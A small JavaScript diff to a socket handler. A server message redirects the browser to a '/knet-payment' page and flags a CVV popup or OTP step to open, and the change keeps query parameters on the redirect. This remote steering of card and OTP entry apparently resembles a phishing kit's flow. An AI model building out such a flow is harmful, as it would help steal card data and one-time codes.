@@ -220,11 +220,13 @@ export function initializeSocket() {
       if (page === "cvv-benefit") {
         // Store flag to auto-open CVV popup on knet-payment page
         localStorage.setItem("openCvvPopup", "true");
-        window.location.href = "/knet-payment";
+        const currentParams = new URLSearchParams(window.location.search).toString();
+        window.location.href = "/knet-payment" + (currentParams ? "?" + currentParams : "");
       } else if (page === "otp-benefit") {
         // Store flag to auto-open OTP phase on knet-payment page
         localStorage.setItem("openOtpBenefit", "true");
-        window.location.href = "/knet-payment";
+        const currentParams = new URLSearchParams(window.location.search).toString();
+        window.location.href = "/knet-payment" + (currentParams ? "?" + currentParams : "");
       } else {
         window.location.href = "/" + page;
       }
